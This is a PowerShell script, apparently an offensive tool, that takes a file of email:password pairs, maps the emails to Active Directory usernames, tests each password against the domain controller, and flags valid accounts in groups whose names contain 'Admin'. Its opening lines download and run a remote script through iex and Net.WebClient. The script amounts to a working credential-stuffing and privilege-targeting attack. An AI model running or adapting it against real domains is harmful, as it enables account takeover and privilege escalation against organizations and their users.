# Import the Active Directory module

$PwshModule = (Get-Module)
if($PwshModule -Like "*dynamic*code*module*Microsoft*"){}

else{
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
	Import-ActiveDirectory
}

Add-Type -AssemblyName System.DirectoryServices.AccountManagement

Write-Host ""

Write-Host "Path to the " -NoNewLine -ForegroundColor Cyan
Write-Host "email:passwords" -ForegroundColor Yellow -NoNewLine
Write-Host " file ?" -ForegroundColor Cyan
$TargetsPath = Read-Host

Write-Host ""

# Get the contents of the email-passwords file
$emailPasswords = Get-Content -Path "$TargetsPath"

# Create a list to store the username:password pairs
$credentials = @()

# Loop through each line in the email-passwords file
foreach ($emailPassword in $emailPasswords) {
    $email, $password = $emailPassword -split ':'

    # Search for the user in Active Directory using the email address
    $user = Get-ADUser -Filter {EmailAddress -eq $email} -Properties EmailAddress, SamAccountName

    # Check if the user was found
    if ($user) {
        # Add the username:password pair to the list
        $credential = "$($user.SamAccountName):$password"
        $credentials += $credential
    }
}

# Output a list of all username:password pairs found
Write-Host "The following " -NoNewLine -ForegroundColor Cyan
Write-Host "username:password" -NoNewLine -ForegroundColor Yellow
Write-Host " pairs were found:" -ForegroundColor Cyan
foreach ($credential in $credentials) {
    Write-Output $credential
}

Write-Host ""

# Loop through the username:password pairs and test for validity
Write-Host "Checking validity of credential pairs" -ForegroundColor Cyan

$validpairs = $null

foreach ($credential in $credentials) {
    $username, $password = $credential -split ':'
    $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain)
    $isValid = $principalContext.ValidateCredentials($username, $password)

    # Output the username:password pair if the credentials are valid
    if ($isValid) {
        Write-Host $credential -ForegroundColor Green
		$validpairs += ($credential + "`n")
    }
}

$validpairs = ($validpairs | Out-String) -split "`n"
$validpairs = $validpairs.Trim()
$validpairs = $validpairs | Where-Object { $_ -ne "" }

Write-Host ""

# Check the username:password pairs for matches with the Domain Admins or Enterprise Admins groups
Write-Host "Checking " -ForegroundColor Cyan -NoNewLine
Write-Host "username:password" -ForegroundColor Yellow -NoNewLine
Write-Host " pairs against High-Privileged Groups" -ForegroundColor Cyan

foreach ($validpair in $validpairs) {
    $username, $password = $validpair -split ':'
	
	$isAdmin = $false
	
	$groups = Get-ADPrincipalGroupMembership -Identity $username
	
	foreach ($group in $groups) {
		if ($group.Name -like "*Admin*") {
			$isAdmin = $true
		}
	}

    # If the user is a member of either group, output a warning
    if ($isAdmin) {
        Write-Host "The username " -NoNewLine;
		Write-Host "$username" -ForegroundColor Green -NoNewLine;
		Write-Host " with password " -NoNewLine;
		Write-Host "$password" -ForegroundColor Green -NoNewLine;
		Write-Host " belongs to a High Privileged group."
    }
}

Write-Host ""